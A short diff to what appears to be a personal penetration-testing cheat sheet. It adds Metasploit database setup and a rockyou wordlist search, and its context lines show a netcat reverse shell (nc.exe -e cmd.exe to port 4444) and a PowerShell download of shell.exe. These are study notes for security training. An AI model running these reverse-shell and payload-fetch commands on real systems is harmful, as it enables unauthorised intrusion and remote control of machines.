@@ -74,6 +74,9 @@ Cmds:
 
 	Show file proof.txt windows	->	c:\Users\admin\Desktop> type proof.txt
 
+	Start Metasploit database	-> systemctl start postgresql
+								-> msfdb init
+
 
 
 MiB Values:
@@ -289,6 +292,8 @@ Book extracts:
 	Run netcat in a Windows netcommand	->	"C:\\Users\\John\\Documents\\nc.exe 192.168.x.x 4444 -e cmd.exe"
 
 	Download file with powershell	-> powershell wget “http://192.168.28.31:8000/shell.exe” -outfile “shell.exe” 
+
+	Show line in rockyou for exact match -> zcat /usr/share/wordlists/rockyou.txt.gz | grep -x "Password1" -n
 
 	
 
